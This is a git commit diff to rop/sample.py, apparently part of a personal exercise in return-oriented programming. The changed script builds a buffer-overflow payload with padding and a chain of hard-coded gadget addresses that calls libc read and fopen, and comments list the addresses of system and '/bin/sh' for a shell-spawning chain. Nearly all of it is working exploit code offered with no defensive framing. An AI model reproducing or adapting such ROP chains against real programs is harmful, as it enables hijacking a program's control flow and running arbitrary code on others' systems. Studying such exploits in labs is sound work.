e82f3f63ccbcbba5d5783820f85530fc73e6ada8
Luca Krueger <luca.krueger@me.com>
2020-03-31 15:30:21 +0000

    able to create file

--- rop/sample.py
+++ rop/sample.py
@@ -10,12 +10,29 @@ f = open("./exploit", "w")
 
 addr = "test.txt\0"
 
-payload = "A" * (24)
-#payload += pack64(0x5555555549e3) # pop rdi; ret;
-#payload += pack64(0x7fffffffe1d8) # pointer to path in buf->buf[136]
-#payload += pack64(0x555555554755) # pop rsi;
-#payload += pack64(0x7ffff79e4ba0) # "w"
-#payload += pack64(0x555555554413) # fopen
+payload = addr + "A" * (24-len(addr))
+payload += "A" * 32
+# read path name from stdin scanf
+#payload += pack64(0x7ffff7a0555f) # pop rdi; ret;
+#payload += pack64(0x7ffff7b97d3e) # pointer to '%s'
+#payload += pack64(0x7ffff7a07e6a) # pop rsi; ret;
+#payload += pack64(0x7fffffffe200) # pointer to hopefully empty space
+#payload += pack64(0x7ffff7a279c8) # pop rax; ret;
+#payload += pack64(0x000000000000) # 0x0
+#payload += pack64(0x7ffff7a5f040) # scanf
+payload += pack64(0x7ffff7a0555f) # pop rdi; ret;
+payload += pack64(0x000000000000) # 0x0
+payload += pack64(0x7ffff7a07e6a) # pop rsi; ret;
+payload += pack64(0x7fffffffe200) # pointer to file
+payload += pack64(0x7ffff79e5b96) # pop rdx; ret;
+payload += pack64(0x5) # pop rdx; ret;
+payload += pack64(0x7ffff7af4070) # read
+
+payload += pack64(0x7ffff7a0555f) # pop rdi; ret;
+payload += pack64(0x7fffffffe200) # pointer to file
+payload += pack64(0x7ffff7a07e6a) # pop rsi; ret;
+payload += pack64(0x7ffff79e4ba0) # "w"
+payload += pack64(0x7ffff7a62e30) # fopen
 #
 #payload += pack64(0x5555555549e3) # pop rdi; ret;
 #payload += pack64(0x5555555545fc) # 0x3 (assuming fd=3 after open)
@@ -43,8 +60,6 @@ f.close()
 # 0x7ffff7af4070 read
 # 0x7fffffffe595 path?
 
-# 0x5555555549e3 pop rdi; ret;
-# 0x555555554755 pop rsi;
 # 0x7ffff7a33440 system
 # 0x7ffff7b97e9a "/bin/sh"
 # 0x555555554a50 'r'
